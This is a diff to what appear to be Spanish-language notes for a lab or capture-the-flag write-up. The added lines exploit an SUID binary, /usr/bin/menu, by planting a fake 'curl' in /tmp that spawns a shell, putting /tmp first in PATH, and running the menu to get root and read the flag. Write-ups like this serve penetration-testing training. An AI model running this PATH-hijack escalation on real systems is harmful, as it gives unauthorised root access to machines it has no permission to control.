@@ -51,3 +51,20 @@ find / -perm -u=s -type f 2>/dev/null
 # Binario fuera de lo comun: /usr/bin/menu (SUID)
 /usr/bin/menu
 # Menu interactivo: 1. status check  2. kernel version  3. ifconfig
+
+## Escalada de privilegios — manipulacion de PATH sobre /usr/bin/menu (SUID)
+ls -la /usr/bin/menu
+strings /usr/bin/menu
+# Confirma: system() invoca "curl -I localhost", "uname -r", "ifconfig" sin ruta absoluta
+
+cd /tmp
+echo '/bin/sh' > curl
+chmod 777 curl
+export PATH=/tmp:$PATH
+/usr/bin/menu
+# Opcion 1 (status check) -> ejecuta nuestro /tmp/curl -> shell como root
+whoami
+# root
+
+cat /root/root.txt
+# Flag obtenida -> ver Anexo C del informe (hash SHA-256)
